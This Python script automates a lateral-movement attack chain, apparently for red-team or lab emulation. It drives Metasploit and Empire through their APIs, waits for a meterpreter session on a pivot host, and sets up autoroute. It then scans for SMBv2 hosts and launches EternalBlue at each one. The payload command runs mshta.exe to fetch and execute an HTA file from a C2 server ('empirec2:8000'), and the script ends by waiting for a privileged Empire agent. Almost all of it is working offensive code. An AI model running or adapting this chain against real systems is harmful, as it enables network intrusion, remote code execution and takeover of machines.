"""
This procedure script demonstrates lateral Remote Code Execution:
1. Waiting for initial meterpreter sesion from pivot node (.191)
2. Get pivot IP address
3. Start MSF autoroute on pivot node
4. Do a SMBv2 scan
5. Launch EternalBlue thru pivot to adjacent target (.196)
6. Wait for Empire session from earlier step

Demo: https://www.youtube.com/watch?v=xI0cSbGo4ZY
"""
from c2_settings import *
from EmpireAPIWrapper import empireAPI
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent
from stage3.internal_reconn.windows import msf_ifconfig, msf_smbv2_scan
from stage3.internal_c2.windows import msf_autoroute
from stage3.escalate_privilege.windows import msf_eternal_blue

# Set both API instances for MSF & Empire
client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)

# Step 1 - Wait for pivot
msf_session_id = msf_wait_for_session.run(client)
print('Got a meterpreter session ' + str(msf_session_id))

# Step 2 - Get pivot address
pivot_address = ''
interfaces = msf_ifconfig.run(client, msf_session_id)
for k, v in interfaces.items():
    if(v['IPv4 Netmask'] in '255.255.255.0'):
        pivot_address = v['IPv4 Address']
        break

# Step 3 - Setup autoroute on pivot
pivot_range = ''
routes = msf_autoroute.run(client, msf_session_id)
print('Added route(s): ' + str(routes))
for r in routes:
    if '255.255.255.0' in r: # 1-254 takes a long time to scan
        pivot_range = r.replace('.0/255.255.255.0','.190-200') 

# Step 4 - Scan for targets
print('Scanning SMBv2 for this range ' + pivot_range)
targets = msf_smbv2_scan.run(client, pivot_range)

# Step 5 - Launch EB payload via pivot to target
for target_address in targets:
    if(target_address != pivot_address):
        cmd = 'mshta.exe http://empirec2:8000/o.hta'
        msf_eternal_blue.run(client, target_address, cmd)
        print('Launched EB against ' + target_address)

# Step 6 - Wait for high_integrity empire agent; 
empire_agent = empire_wait_for_agent.run(API, need_privilege=True)
print(empire_agent)